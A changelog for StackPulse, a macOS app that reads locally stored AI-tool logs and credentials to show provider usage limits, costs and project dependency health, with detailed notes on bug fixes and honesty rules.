# Changelog

All notable changes to StackPulse are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

Note that StackPulse tracks **four independent version lines** — the app, the
core, the protocol, and (later) a compatibility manifest — as described in
[ADR-0006](docs/decisions/0006-independent-version-lines.md). Entries below note
which line changed. Protocol- and core-level changes that affect other repos are
also recorded in [`docs/CROSS_REPO_CHANGELOG.md`](docs/CROSS_REPO_CHANGELOG.md).

## [Unreleased] — Phase 0 foundation

First working foundation. Everything below is proven against real Claude Code and
Codex CLI logs on macOS (Apple Silicon).

Version lines at this point: **core 0.1.0**, **protocol 1.20.0**, app pre-release.

### Live readings for every remaining provider (app 0.48.0)

Completes the sweep started with Cursor: **Codex, Copilot, Antigravity, Z.ai, Grok
and Devin** now show real, provider-reported usage instead of detection-only cards.
Each reads a credential the tool already stored on this Mac — nothing to paste —
and calls the same endpoint that vendor's own CLI or dashboard calls.

- **Codex** — session + weekly limits now come from OpenAI's usage endpoint rather
  than being derived from the CLI's logs: authoritative, fresher, and classified by
  the window length the API reports (not slot order). Log-derived windows survive
  the merge when the API doesn't report one. Flex credits shown as remaining.
- **Copilot** — per-seat premium-request quota using the token Copilot (or `gh`)
  already stored locally; **no PAT to create**. An org/enterprise seat has no
  per-user quota, which is stated rather than shown as an empty meter.
- **Antigravity** — real 5h + weekly quota buckets from its own language server over
  **loopback** (port and CSRF token discovered from the running process). No OAuth,
  no cloud call. Complements the existing conversation scan.
- **Z.ai** — Coding Plan session/weekly quota with your saved key.
- **Grok** — weekly usage from the billing endpoint the Grok CLI itself calls, using
  the login in `~/.grok`.
- **Devin** — daily + weekly quota and extra-usage balance from the seat-status
  endpoint. The daily window is labelled **"Daily"**, never borrowed into the "5h"
  slot.

**Honesty rules held throughout.** A window the API didn't report is **dropped, never
rendered as 0%**; every reading carries its capture time so it can't pass as current;
tokens and response bodies are never logged; no credential means "absent", not
"failed"; and no client refreshes a token (rewriting a CLI's `auth.json` could log the
user out of their own tool). Amounts stay in the unit the provider reported — Grok's
on-demand cap is in credits, so it is *not* converted into a dollar figure. Every
provider card now says plainly that these endpoints are undocumented and can stop
working without notice.

Internally, the per-provider fetch/merge/strip logic was generalised into one
throttled path (a new provider is one table entry), and the merge no longer strips by
provenance — Codex reports its own limits with the same tag, so the store now tracks
exactly which windows it injected.

- **Claude credential resolution now follows openusage's design (`ClaudeAuthStore`).**
  Three differences from what we had, all of which caused the wrong-login bug below:
  **keychain before file** (a stale `~/.claude/.credentials.json` must not outrank a
  live Keychain item just because its `expiresAt` is later — openusage fixed this as
  a real bug); a token within **5 minutes of expiring is refreshed in place**
  (`platform.claude.com/v1/oauth/token`) instead of abandoned; and the rotated
  credential is **written back to the source it came from**, so renewing for
  StackPulse can't leave Claude Code holding a dead token.
  Safeguards this adds *beyond* openusage, because it writes real credentials: the
  prior blob is **backed up once per source** before the first write and never
  overwritten; every source is **re-read immediately before writing** and the write
  is **aborted** (adopting what was found) if anything changed, so a token `claude`
  rotated concurrently is never clobbered; unknown JSON keys are preserved; and
  Claude Desktop stays **read-only** — its refresh token is never used, since
  rotating it would sign the user out of the Desktop app.
  One deliberate divergence: openusage queries the user-scoped Keychain item first,
  we query **service-only first**, because the durable "Always Allow" grant is scoped
  to the query that created it and leading with the other shape re-prompts.
- **Fixed: Claude limits could describe the WRONG login, silently.** When the Claude
  Code token expires, the credential read falls back to Claude Desktop's login (added
  in 0.33.0 for Desktop-only users) — but nothing said so, so a hammered Claude Code
  session displayed Desktop's barely-touched quota as if it were its own (observed:
  "1% used" on a weekly window during heavy use). A successful read of the wrong
  account is more dangerous than a failed one, because it looks authoritative.
  Now: the fetch carries a **caveat** alongside the values, the card states plainly
  that these are the Desktop login's limits and offers **Renew Claude Code login**,
  the caveat is **persisted with the cached values** (a warning that didn't survive
  relaunch would let the reading come back clean), and the menu bar **drops** the
  percentage entirely — the same rule it already applies to stale readings, since the
  strip has no room to explain and an unlabelled number there reads as "your usage".
  It degrades to today's token volume, which is measured locally and is genuinely the
  user's. `--selftest-live` now prints which credential source answered and each
  window's reset instant, which is how this was found.
- **Fixed: Codex no longer shows a green "$0.00 left".** A plan without the flex-credit
  system reports a balance of 0, which was rendering as a measured zero — reading as
  "you're out of money" when the truth is "this plan has no credits at all". Absence
  of a credit system is not a zero balance, so no balance is shown.
- **Menu bar: real brand marks + both limit windows, stacked.** Each cell now leads
  with the AI's **own brand mark** (Anthropic's burst, OpenAI's knot, Cursor's cube,
  …) instead of a two-letter code that was misread at menu-bar size ("Cl" reads as
  "CI"), and shows **both** windows when a provider reports two — **stacked on two
  tight lines**, session over weekly — instead of only the hottest, which hid a
  comfortable session sitting inside a nearly-spent week. Percentages are remaining,
  matching every card.

  The strip is drawn as a **template image** (a SwiftUI view through `ImageRenderer`,
  trimmed to its visible pixels) rather than an attributed title, because text
  attachments can't stack; being a template, macOS tints it for light/dark and for
  the clicked state. The coloured "▶N" and "⚠︎N" badges stay text precisely because
  their colour carries meaning a template would flatten. Marks are vector paths with
  an SVG parser that normalizes each to its **true bounding box** — several vendors
  bake 10% padding into their viewBox while others run edge-to-edge, so viewBox
  scaling alone made some marks visibly smaller. Gemini has no mark upstream and
  falls back to an SF Symbol. Stale windows are still dropped, so the always-visible
  readout never shows an old percentage as live.

  Attribution: the mark artwork comes from openusage's `ProviderIcons` (MIT,
  redistributed under it), and `NOTICE` now records both that copy — the file
  previously claimed nothing was copied verbatim, which stopped being true — and
  that each mark remains its vendor's trademark, used for identification only.
- **New `make install`.** `build-app.sh` only produced the executable and
  `package-app.sh` only assembled `dist/StackPulse.app` — neither touched the copy you
  actually launch, so it was possible to build, test and verify a change while the
  running app stayed on an old build (which is exactly what happened). `make install`
  packages, replaces the installed bundle (`INSTALL_DIR`, default `~/Desktop`), and
  **verifies** the installed version and its parser self-test before relaunching,
  instead of assuming.

Verified: 208 Rust tests, **149 Swift tests**, and 12 headless parser self-tests
(`--selftest-parsers`) all green.

### Limits read in the provider's own direction (app 0.49.2)

Percentages now show **used**, not remaining — "46% used", with the meter filling as
you spend. The values were never wrong: 54% left and 46% used are the same fact. But
the screen people check this against is the provider's own panel (Claude Code shows
"Weekly 46%", Codex the same), and showing the complement meant every comparison
needed mental arithmetic and read as a contradiction — which is exactly how it got
reported, twice. Same number, same direction, nothing to translate.

Verified against Claude Code's own usage panel on the same machine: 5-hour 25% vs 28%
and weekly 46% vs 47%, the gaps being live usage between the two readings.

### Claude's percentage is back — the dead-credential dead end (app 0.49.1)

Claude showed no limits at all on a machine that had a perfectly good Claude login.
Root cause, found by dumping the Keychain: this Mac carries **247**
`Claude Code-credentials*` items (one per `CLAUDE_CONFIG_DIR`), and the one the app
reads is a six-day-old fossil whose `refreshToken` is an empty string — dead, and
unrefreshable. Claude *Desktop* held a live token the whole time.

The regression was mine. Fixing the earlier wrong-account bug, I told the store never
to fall through to Desktop — correct for a refresh that fails mid-flight, wrong for a
credential that can never work again, which is exactly openusage's rule: Desktop is
consulted once the Claude Code login cannot produce a valid token. Falling through
*unlabelled* was the original bug; refusing to fall through at all was the
overcorrection, and it traded a wrong number for no number.

Now: a dead or unrefreshable Claude Code credential falls through to Desktop, the
reading is labelled with the login it came from (with a one-click "Renew Claude Code
login"), and the menu bar shows it again rather than blanking — it is the user's own
live Claude login, and it was the only Claude limit that existed on that machine.
Verified: weekly 46% used, session 24% used, which is what heavy mid-week use looks
like. The earlier "1% used" that looked wrong was a genuinely just-reset weekly window.

### Popover density — the glance surface now fits the glance (app 0.49.0)

The menu-bar popover spent its vertical budget on chrome: a two-column money grid
plus a separate cache/burn row cost ~80pt per provider, so barely one provider fit
above the fold. Same data, laid out for scanning: "today" keeps the headline size
because it is the number you act on, the 30-day total sits beside it as context, and
volume / turns / savings / burn collapse to one secondary line. The header dropped to
one line (the UTC bucket date moved to its tooltip), card row spacing went 8 → 6, and
long provider notes clamp to two lines with the full text on hover — clamped, never
edited down, since they carry the honest "why". Result: three providers and the
roll-up visible without scrolling, where one and a bit fit before.

### Cursor live usage + limits read as "% left" (app 0.47.0)

**Cursor goes from "no source" to a full readout.** Cursor publishes no individual
usage API, so StackPulse now reads the same endpoints Cursor's own dashboard calls,
authenticated with the user's **local** Cursor session:
- The access token comes from Cursor's own state DB
  (`…/Cursor/User/globalStorage/state.vscdb`, read-only) with the `cursor-access-token`
  Keychain item as a fallback — both via the same bounded shell-out the app already
  uses for Claude's Keychain item (linking a second SQLite would collide with the one
  the Rust core bundles).
- The dashboard session cookie is rebuilt from the token's own `sub` claim, and
  `GetCurrentPeriodUsage` / `GetPlanInfo` are called over Connect-RPC.
- Surfaced: **Total / Auto / API** meters, the **authoritative billing-cycle reset**
  (never an assumed month), **Extra usage** on-demand dollars, and the plan name.

Honesty rules kept intact: a meter Cursor didn't report is **dropped, never rendered
as 0%**; on-demand spend that wasn't reported stays absent rather than a measured
`$0.00`; every reading carries its capture time so it can't pass as current; and the
whole path degrades to "no reading" on failure. The provider note now states plainly
that these endpoints are undocumented and can stop working without notice. Gated on
the existing live-limits (network) consent; turning it off strips the reading.

**Limits now read the way people actually read a quota.** Every surface (popover,
sidebar, Overview, Command Center) shows **"81% left"** with the meter *emptying* as
you spend — instead of "19% used" with a filling bar — and shows **both** the session
(5h) and weekly windows side by side rather than only the hottest one. Colour still
keys off consumption, so a window reddens as it runs out.

**Removed the cache hit-rate percentage** from every surface (popover, Overview,
Usage, Command Center, sidebar, Reports). Measured **cache savings in dollars** stays
— it answers the same question in the unit that matters. Limit-window labels were
also de-duplicated into one shared formatter (they were four private copies).

### Provider usage features — real data where it honestly exists (app 0.46.0, core adds OpenCode scanner)

Filling in the eight previously detection-only providers (Copilot, Cursor, Devin,
Gemini, Grok, OpenCode, OpenRouter, Z.ai). Each was researched against official
docs / open source; the rule was **real data or an honest "no source", never a
guess**. What each got:

- **OpenCode — a full local scanner (core).** New `providers::opencode`: reads
  OpenCode's own session store — the current SQLite `message` table
  (`~/.local/share/opencode/opencode.db`) *and* the legacy per-message JSON — for
  real per-model tokens/cache/reasoning, priced by StackPulse's own table, windowed
  and charted exactly like Claude/Codex. Promoted from detection-only; degrades to
  empty when OpenCode isn't installed. (Fixture-tested from the pinned upstream
  schema.)
- **OpenRouter — richer, and works with a plain key.** Switched the balance fetch
  to `GET /api/v1/key`, which a normal `sk-or-v1-…` inference key can call and which
  returns remaining credit, all-time usage, **and** daily/weekly/monthly spend (now
  shown). Falls back to `/credits` and `/auth/key`. (`/activity` and `/credits` now
  require a management key, so they're deliberately not attempted for a BYOK key.)
- **GitHub Copilot — real premium-request usage (BYOK).** A fine-grained GitHub PAT
  with "Plan: read" now reads your own Copilot premium-request consumption + spend
  via the GitHub billing API (resolves your login, then
  `…/billing/premium_request/usage`). Personal-billing only — org/enterprise seats
  have no per-user endpoint, which is reported plainly, not as a zero.
- **Gemini, Grok, Devin, Cursor, Z.ai — the honest "why not".** These have no
  individual usage/spend source that can be read without fabricating: Gemini CLI
  keeps token counts in memory (only prompts hit disk); a normal xAI key has no
  balance endpoint (that needs a separate management key); Devin's individual API
  lists sessions but not ACU/spend (enterprise-admin only); Cursor keeps usage
  server-side with only an undocumented, unstable local store; Z.ai/Zhipu exposes no
  public balance endpoint. Each now says so specifically on its card instead of a
  generic "not implemented / planned".

Verified: `cargo test` (208 core), `swift test` (136, incl. the balance-parser
self-test), `--selftest-parsers`, and a headless snapshot showing OpenCode
registered as a real scanner.

### Exhaustive repository audit — correctness, honesty, data-safety, and CI (app 0.45.0)

A full 10-dimension audit of the whole repo (logic, flows, empty/error states,
security, data persistence, performance, accessibility, dependencies, tests,
production config). Findings were validated against source, de-duplicated, and
classified; only **critical + high** were fixed, each with a reproducing test.
No critical issues existed. See [`AUDIT.md`](AUDIT.md) for the full report.

**Correctness (core)**
- **Codex per-project spend no longer double-counts reasoning.** `project_usage.rs`
  stored the raw (reasoning-inclusive) `output_tokens` *alongside* `reasoning_tokens`,
  billing and counting reasoning twice — the exact twin of the already-fixed
  `providers/codex.rs` bug, which per-project attribution never received. Output is
  now stored exclusive of reasoning, and the dedup key includes `reasoning` so two
  genuine same-second turns aren't collapsed. Inflated a reasoning-heavy project's
  cost ~36%.
- **Spend-anomaly alerts stop crying wolf for intermittent users.** `today_vs_avg_ratio`
  divided today's cost by `total / 30`, so someone active a few days a month read as
  a 15–30× "spend spike" on a perfectly normal day. It now divides by *active* days
  (matching `burn_rate`), asking "high for a day I actually use this?".

**Data safety (core)**
- **A corrupt `history.json` is no longer silently destroyed.** The durable history
  store (the one dataset kept past the ~30-day log window) degraded a parse failure to
  an empty map, and the next write overwrote — permanently erasing months of history.
  Corrupt bytes are now quarantined to a `.corrupt` sidecar before degrading, so
  they're recoverable; genuine emptiness is left alone.

**Data safety (app)**
- **Old `command_runs.json` files no longer wipe your run history.** `CommandRun.safety`
  had a default value, but Swift's synthesized decoder ignores stored-property defaults
  and required the key — so a file written before the field existed threw and collapsed
  the entire array to empty, which the next save made permanent. A tolerant decoder now
  defaults a missing `safety` to `read_only`.

**Honesty (app) — no false all-clears**
- The **Needs-Attention** bell showed a green "All clear" during a data-read error
  (alerts derive from the snapshot, so they're empty when it fails to load). It now
  says "Can't tell right now" and shows the error instead.
- The **Discover** radar showed a green "Nothing to flag — looks healthy" even when it
  scanned **0** projects. Zero-scanned is now "Nothing scanned yet", not a clean bill.
- **Usage → Breakdown** rendered "· 0 tok · N turns" *and* "No activity in this window"
  for server-side-accounted providers (Antigravity) — a forbidden fake-zero that
  contradicted the turn count. It now omits the token count and says usage is counted
  server-side.
- **Domain-scan failures no longer masquerade as clean empties (systemic).** The
  secondary scans (`projects`, `stackHealth`, `services`, `projectUsage`, `radar`)
  returned `[]` on error indistinguishably from a genuine empty, stamped "updated just
  now", and overwrote good data — so a core error rendered "No running dev servers" /
  "No dependency data" / "No project-attributed usage" as a freshly-timestamped success,
  and a transient failure wiped the last good reading. `CoreBridge` now returns `nil` on
  a real failure (vs `[]` for scanned-empty); the store keeps the last good data + its
  timestamp and flags the failure; and each section renders a distinct "couldn't scan"
  state instead of the reassuring empty.

**Performance (core)**
- **Antigravity scanning is bounded.** Every refresh opened one SQLite DB and read up
  to 1 MiB per conversation, unbounded and forever-growing — while only the newest
  model was ever used. Enumeration stays complete (counts unchanged); the model scan is
  now lazy (newest-first, stops at the first hit) and the step-count SQLite work is
  capped.

**Accessibility (app)**
- Added missing `accessibilityLabel`s to icon-only controls that had only tooltips: the
  sidebar clear-filter and favorites toggle (with state), and the Command Center
  full-screen and move-to-display buttons.

**Production / CI**
- CI now runs **`swift test`** (the whole Swift suite was compiled but never executed —
  Swift-layer regressions merged green) and **clippy on the full workspace including the
  FFI crate** (the unsafe C-ABI bridge was previously unlinted in CI).

### Decoder resilience — a leaner core or one bad element can't break the app (app 0.44.0)

### Decoder resilience — a leaner core or one bad element can't break the app (app 0.44.0)

The last robustness gaps before launch, from the earlier review's "chase the last
point" list. All three are about a snapshot surviving imperfect input gracefully
instead of failing loudly or — worse — falsely.

- **A leaner/future core no longer fails the whole snapshot.** `ProviderUsage` was
  the one collection type without a defensive decoder: if a provider omitted any of
  `windows`/`models`/`limits`/`capabilities`/`notes`, the entire snapshot threw and
  the app showed "No data". It now defaults those to empty, degrading that one
  provider to "no data for that dimension" while the rest survives. Its load-bearing
  scalars (id, detection state) stay required — a provider without them is genuinely
  malformed, not merely lean. Kept honest: this is safe precisely where a defaulted
  `SchemaCanary` would not be, because an empty list is a truthful absence, not a
  false claim of health.
- **One malformed alert no longer empties the inbox.** `alerts`/`missions`/`insights`
  decoded all-or-nothing: a single bad element collapsed the whole array to `[]` —
  and for alerts, an empty inbox reads as "all clear", a decode error masquerading as
  a clean bill of health. They now decode element-by-element (`decodeLossyArray`),
  keeping every item that parses and dropping only the unreadable one, so a real
  alert can't be hidden by a sibling's bad field.
- **Documented the Claude live-limits invariant.** The live-limit merge assumes the
  offline core never reports a Claude limit (Claude's limits are network-only);
  spelled out why that holds and where to revisit it if the protocol ever changes.

4 new tests. Gate: 233 Rust tests, 132 Swift tests, clippy + fmt clean.

### Launch polish: one clear IA, a great first run, GitHub-ready (app 0.43.0)

Preparing StackPulse for a public GitHub launch — and fixing the "too many menus"
feeling. The surfaces stay (the popover for a glance, the always-on edge sidebar,
the main window, and the Command Center for a second display), but each now has a
clearer job and a clearer way in.

**The Command Center was unreachable from the main window** — only the popover, a
menu, and ⌘⇧C knew it existed. Added a clearly-labeled entry in the main-window
sidebar ("Command Center — full-screen monitor for a second display · ⌘⇧C"),
styled to read as "opens a window", not a nav pane. It's optional, and now easy to
find.

**A great first 60 seconds.** A stranger who clones and runs StackPulse with no
AI-tool logs used to land on a wall of grey "not detected" cards. Now a warm
**cold-start hero** on Home explains the two truthful ways data arrives (use an AI
tool → it reads the logs; add a folder → it fills Projects/Advisor) with the one
next action. Several empty states got specific, actionable copy instead of "No
data".

**See it with sample data.** A new opt-in demo mode fills the app with fabricated
activity so a first-run visitor can see the real product — Claude/Codex spend,
live limits (one on track to run out, to show the forecast), sessions. The hard
guard, because this app's whole value is honest reporting: it's **off by default**,
does no scanning or network, the sample is built through the real decoder (so it
can't render something malformed), and **every surface shows a prominent "Sample
data — not from your Mac" banner** while it's on. One tap in the cold-start hero to
try it, one tap to leave, plus a Settings toggle.

**GitHub-ready.** README got a hero-image layout, a scannable "What it shows you"
feature list, and static badges — and its "known inaccuracies" section was
corrected: three of the caveats it listed described bugs *fixed this session*
(cache-write TTL split, OpenAI rate verification, the Sonnet-5 clock), and the
protocol version was stale at 1.18.0. Added GitHub issue templates (with a provider
dropdown and a required "no raw logs/tokens pasted" confirmation matching the
honesty ethos), a PR template mirroring the real CI gates, and a `docs/` index.

5 new tests (demo-data decode + honesty invariants). Gate: 233 Rust tests, 128
Swift tests, clippy + fmt clean. Verified: demo mode launches populated without a
crash. **Screenshots are yours to capture** (`docs/images/` documents the exact
three shots); the README references them.

### Bug-check pass: fix what a 6-agent review found (app 0.42.0)

A parallel adversarial review (six agents over the Rust core and Swift app) plus a
design pass. Nine real bugs fixed, two of them honesty-critical, plus two design
improvements that stop a class of bug recurring.

**Codex output cost was overstated ~36% (HIGH).** OpenAI's `output_tokens` already
includes `reasoning_output_tokens` as a subset, but the scanner stored both and the
cost billed both — double-counting reasoning in cost AND the token total. Fixed to
store exclusive visible output; the fixture test now pins the exact cost (it only
asserted `> 0` before, which is how this slipped). Combined with the 0.41.0 rate
fix, Codex 30-day is now correct in both directions.

**Advisories could be shown for the wrong version (HIGH honesty).** Enrichment was
cached by package *name*, but OSV advisories are per-*version*. Two projects using
the same package at different versions shared one record — a false positive (a
patched project showing a fixed advisory) or, worse, a false negative (a vulnerable
project showing "0 advisories" because a patched sibling was checked first). Root
cause was a design one: `dep.id` was overloaded as both the UI row identity and the
cache identity. Split them — a new version-scoped `enrichmentKey` caches what the
record is actually about.

**OpenAI pricing was version-blind (MEDIUM, my own 0.41.0 code).** The new matcher
keyed on the variant name alone (`sol`/`mini`/…), so a future `gpt-6-sol` would have
been priced at the 5.6 card with no canary drift — the exact Opus-3× mistake,
reintroduced. Now version-strict like the Claude path; an unrecognized generation is
unpriced, not mispriced.

**A subprocess timeout that couldn't fire (MEDIUM).** `readViaSecurityCLI` and the
Desktop-cache `sqliteQuery` bounded their reads with a poll loop over
`FileHandle.availableData` — which blocks with no output, so the deadline check was
never re-reached while a Keychain "Allow" prompt or a locked DB held stdout open.
The live-limits fetch could hang until restart. Both now use one `BoundedProcess`
helper that terminates the process at the deadline.

**System daemons leaked into the services list (MEDIUM).** macOS `lsof` truncates
the COMMAND column to 9 chars, so the noise filter's longer needles
(`mdnsresponder`, `nsurlsessiond`, …) never matched — daemons showed as your dev
servers, and Docker got no kind. Added `+c 0` for full names, and unescape lsof's
`\x20` so names read cleanly.

**A nested npm dep could shadow the resolved version (MEDIUM).** A transitive copy
whose lockfile key sorts first (BTreeMap order) overwrote the top-level version —
lodash reported 3.10.1 when the project resolved 4.17.21. Now the shallowest
`node_modules/` depth wins.

Also: the menu-bar percentage is now aged like every card (a stale Codex reading no
longer shows as live in the one always-visible surface); live-limits fetches back
off on sustained failure instead of hammering the API every tick; the Claude
expired-credential state reports "waiting for renewal" not "sign in"; the Codex
dedup key includes reasoning so distinct turns aren't collapsed.

**Design (leave it better):** the duplicated subprocess-timeout logic became one
deep `BoundedProcess` module (the tricky `availableData` knowledge now lives once);
the overloaded `dep.id` was split into row-identity vs. version-scoped cache key.

23 new tests. Gate: 233 Rust tests, 124 Swift tests, clippy + fmt clean. Verified
live: Codex 30-day corrected, daemons gone from services, service names clean.

### Forecast your limits, and price Codex correctly (app 0.41.0)

Two depth improvements on the core promise — trust the numbers, and act on them
before they bite — plus the fixes from a bug-check pass over both.

**Limit forecasting.** StackPulse showed a live percentage and a burn rate but
never connected them. Now it watches each Claude limit's percentage *over time*
(`limit_samples.json`), fits the observed rate, and says "at this pace, ~5 hr to
the limit — before it resets" under the meter, plus a **proactive notification**
while you're still in the 40–80% band and there's room to react — the threshold
alerts only fire at 80%/95%, often too late. The whole engine is built to refuse
to make things up: too little history forecasts nothing ("need a few more
readings"); a window reset is a discontinuity, so pre-reset samples are dropped
rather than fitted across the cliff into a garbage rate; a flat pace honestly says
"you won't reach it"; and a hit projected past the reset is reported as clearing
the window. It never converts token spend into a limit percentage — it can't see a
hidden limit's accounting, so it only extrapolates the number the provider
actually reports.

**Codex costs were understated ~3–4×.** The OpenAI rate card was self-flagged as
unverified and used the same loose substring matching that once mispriced Opus 3×.
Verified against OpenAI's published list (developers.openai.com/api/docs/pricing,
2026-07-17) and matched strictly by tier: the real models in local Codex logs —
`gpt-5.5` (the most-used), `gpt-5.6-sol`, `gpt-5.4`, `gpt-5.3-codex` — now price at
their true rates ($5/$30, not the old flat $1.25/$10), correcting a real Codex
30-day figure from a large undercount up to its actual value. Any *unrecognized*
GPT/Codex id now returns unpriced (the canary reports it) instead of borrowing a
sibling's rate, and the internal `codex-*` tooling ids (`codex-auto-review`,
`codex-security-scans-…`) are honestly left unpriced — they aren't published API
models. The verified rates are pinned in a test, the protection the Opus card
lacked.

**Bug-check fixes (found reviewing the above before commit):**
- The forecast alert is now **latched per reset-cycle**. A forecast is a noisy
  signal, and `NotificationGate` re-fires any alert that clears and returns — so an
  un-latched forecast alert would have pinged repeatedly as the fitted rate
  wobbled. It now fires once per cycle.
- Samples are recorded **before** the notification pass, so the alert forecasts
  from the reading just fetched rather than lagging one sample.
- Sample pruning is **per-window**, so a frequently-sampled 5h window can't evict
  the weekly window's history and starve its forecast.
- The 1-hour staleness bound is one shared constant (`LimitWindow.liveStaleAfter`)
  instead of a `60 * 60` literal repeated across three files.

10 new forecast tests (mutation-verified: disabling reset handling, or the
min-span guard, each fails exactly the named test) and the pinned OpenAI rate
table. Gate: 116 Swift tests, 230 Rust, clippy + fmt clean. Verified live: Codex
30-day cost corrected, `gpt-5.5` priced at $5/$30, `codex-auto-review` flagged
unpriced by the canary.

### Launch at login, honest BYOK, fuller onboarding (app 0.40.0)

Working the "what's left" shortlist — and the honest first finding was that **two
of the five items were already built**: command run history persists to
`command_runs.json` with a full view/re-run/clear UI, and evidence-based
completion/handoff (`MissionHandoff`) already composes a verified handoff package
in Missions. Not going to re-announce work that exists. The three genuinely-unbuilt
ones:

**Launch at login.** A menu-bar monitor is only useful while running, so
`LaunchAtLogin` (via `SMAppService.mainApp`) offers to start StackPulse at login —
off until you say yes. It stores nothing: the OS owns the login item, so the switch
reads the live status every time rather than a remembered bool that would drift the
moment you flip it in System Settings. `.requiresApproval` (macOS holding it
pending your OK) reads as *not enabled*, because it isn't, with a line telling you
where to approve it. A new **Startup** card in Settings and a toggle in onboarding.

**Honest BYOK.** Five providers (OpenAI, Z.ai, Mistral, Perplexity, Groq) stored an
API key and showed *"balance coming soon"* — a promise the app had no plan to keep
and, for most, no endpoint that would let it. A standing "coming soon" is a small
lie that never resolves. Replaced with the fact: *"Key saved. <provider> has no
balance StackPulse can read, so none is shown"*, and the chip reads **"No balance
readout."** The three providers with real endpoints (OpenRouter, LiteLLM, DeepSeek)
still fetch. A test forbids any provider note from implying a future balance.

**Fuller onboarding.** The spec lists ten first-run concerns; onboarding covered
four. Now six pages, not ten — the flow's job is to get out of the way. A new
**"What's on this Mac"** page shows the providers StackPulse detected (honest about
the still-scanning and none-found cases) and folds in the one real integration
choice (Claude live limits, the only feature that reads a credential and goes
online). A new **preferences** page covers notifications, launch-at-login, and —
shown only when you actually use them — an acknowledgement that StackPulse follows
your Reduce Transparency / Reduce Motion settings (system-owned, so acknowledged,
never faked as an app toggle).

4 new tests on the BYOK honesty rule. Gate: 106 Swift tests, 230 Rust, clippy + fmt
clean.

**Compiler gotcha (cost a debugging pass):** passing a bare instance-method
reference as a SwiftUI `Binding(get:set:)` set closure (`set: setEnabled`) crashed
swift-frontend in **IRGen** (signal 6, not a type error) on this Swift 6 / CLT
toolchain. Inlining to `set: { setEnabled($0) }` fixed it. IRGen crashes name the
file, not the line — bisect by construct, not by reading the error.

### Integration Diagnostics — is StackPulse working, and if not, why (app 0.39.0)

The spec's `DIAGNOSTICS` screen (a Phase 1 exit criterion) was never built. The
signal existed — scattered across Settings, Integrations, Data Checks, and the
live-limits plumbing — but nowhere did the app answer, in one place, "is this
working right now, and if not, what do I do." A new **Diagnostics** section
(Advisor-adjacent, in the configuration nav group) does.

It reads only state the app already gathered — **no new network call, no secret
read** — and folds it into checks across Versions, Data refresh, Providers,
Credentials, Data integrity, Notifications, Folder access, and Platform. The one
genuinely new thing is the derived **"Needs attention"** list: every problem and
warning, worst first, each with a concrete **repair step**. A diagnostics screen
that only says "something is wrong" is a dead end; this one says "Claude's login
expired → run `claude` in Terminal" and "notifications are on but macOS blocked
them → allow in System Settings."

Built on the same honesty rules as everything else:

- **`N/A` is never folded into `OK`.** Live limits off, notifications off, no local
  activity to verify, a compatibility manifest that isn't built — all report as
  not-applicable, not as a clean bill. "Nothing to check" and "checked out fine"
  are different claims. A no-data canary reading OK would be the exact failure the
  canaries exist to prevent.
- **Credential health is the actual outcome of using it** (the live-limits fetch),
  not "a file exists" — presence is not a working token.
- **What can't be verified says so.** The compatibility manifest reports "not built
  in this version" rather than inventing a version; folder readability defers to
  the real scan error rather than assuming each root is still readable.

Plus a **sanitized support bundle** (the spec's other half): a copy-paste text
report of versions, status tokens, and repair steps. It carries the guarantee by
construction — assembled only from the report, which holds no secret, with the home
directory collapsed to `~`, and no field through which a token, prompt, or log line
could enter. It states its own guarantee at the top.

21 new tests across the model and the bundle, each mutation-verified: folding a
no-data canary into OK, and disabling path redaction, each fail exactly the named
tests. Adding `MainSection.diagnostics` was the usual exhaustive-switch sweep;
swiftc enumerated every site.

### Find one project in a long list (app 0.38.0)

30 projects in Projects, 27 in Stack Health, and no way to find one — you scrolled.
The Launcher had a filter; the two longest lists did not.

All three now share one field and, more importantly, **one rule**. The Launcher's
own rule matched the project *name* only, which silently disagreed with what the
other two would have needed: this portfolio keeps projects under several roots
(`App Privadas`, `Documents/Claude/Projects`, `Desktop`), and the folder is often
how you say which one you mean. `ProjectFilter.matches` now matches name **and**
path, every whitespace-separated term must hit, and terms are order-independent —
so `privadas remotion` finds `remotion-video`, and typing more always narrows,
never widens. Verified against the live scan: `tren` → 1 of 30, `scout` → 5,
`zeder` → 1.

Two things a filtered list owes the reader, both included:

- **"Showing 3 of 27."** A filtered list that only shows its matches looks exactly
  like a short list. Without the count, narrowing to 3 projects and reading it as
  the whole portfolio is a mistake the UI invited.
- **An empty result names the query** — "No project matches “xyz”" with a Clear
  button — rather than rendering the same blank as "you have no projects".

Stack Health's cross-project digest is deliberately **not** filtered. It answers
"is anything on fire across everything", and its subtitle states the scope it
folded ("27 projects · 537 deps"); narrowing it would leave the same words
describing a different set. The filter narrows the cards below it.

A whitespace-only query matches everything, so a stray space can't empty the list
and read as "no projects". 11 new tests; restoring the old name-only rule fails
five of them.

### The AI prompt waits until it knows something (app 0.37.1)

0.37.0 gated **Copy AI prompt** on "this project has dependencies that are not up
to date". That bucket is not what it sounds like. The offline core reports **every**
dependency as `unknown` — verified on a real project: all 15 of trencito's deps come
back `unknown`, 0 advisories — so before a registry check the entire manifest counted
as "not up to date" and the button appeared. It would have copied 15 packages with
`latest: —` presented as findings, and asked an AI to advise on upgrades nobody had
established were needed.

The gate is now what it should have said: **at least one dependency StackPulse
actually knows is outdated** — a resolved `minor_behind` / `major_behind` /
`deprecated`, or a real advisory. An unrecognized status from a future core counts
as unknown, not as a finding. `unknown` is the absence of an answer; it is neither a
problem nor an all-clear, and it is now treated as neither.

Two things follow from that:

- **A known-outdated status can only come from enrichment**, so the prompt can no
  longer be built without a registry reading behind it. `checkedAt` is non-optional,
  and the "no update check has run" branch is deleted — it was unreachable, and it
  was subtly wrong regardless: a check that *ran and failed* is not a check that
  never ran.
- **Dependencies the registry never answered for are counted and declared**:
  *"N other dependencies are missing from this table … Not listed ≠ known to be
  fine."* They are absent from the table because their status is unknown, and an
  absence reads as an all-clear unless something says otherwise.

The rule lives in one place (`DependencyAdvicePrompt.isKnownOutdated`) rather than
in the view that happens to need it — the view is where the previous version of this
mistake lived. 7 new tests; reintroducing the old gate makes exactly the named ones
fail.

### Ask an AI about your dependencies (app 0.37.0)

Stack Health could say "lodash 4.17.20 is behind, and OSV matched GHSA-…". It could
never say the thing you actually want: **is that real, do I have to care, and will
upgrading break me?** Answering needs judgement about the code, and StackPulse
never reads the code — so rather than start summarizing advisories it hasn't read,
it now hands the facts to something that can reason about them.

**Copy AI prompt** on each project card builds a prompt from that card's findings:
package, scope, required range, installed version, latest, interpreted status, and
